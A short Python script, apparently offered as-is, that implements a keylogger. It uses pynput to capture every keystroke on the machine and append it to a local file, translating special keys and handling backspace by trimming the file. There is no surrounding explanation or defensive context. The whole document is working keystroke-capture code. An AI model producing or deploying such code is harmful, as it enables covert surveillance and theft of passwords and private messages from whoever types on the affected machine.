from pynput.keyboard import Listener

log_file = "keylog.txt"

def log_key(key):
    key = str(key).replace("'", "")  # Remove extra quotes

    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "[TAB]",
        "Key.shift": "",
        "Key.ctrl": "",
        "Key.alt": "",
        "Key.backspace": "[BACKSPACE]"
    }

    # Replace special keys
    key = special_keys.get(key, key)

    # Handle backspace properly (remove last character from file)
    if key == "[BACKSPACE]":
        with open(log_file, "r") as f:
            content = f.read()
        with open(log_file, "w") as f:
            f.write(content[:-1])  # Remove last character
    else:
        with open(log_file, "a") as f:
            f.write(key)

# Start listening to keyboard events
with Listener(on_press=log_key) as listener:
    listener.join()
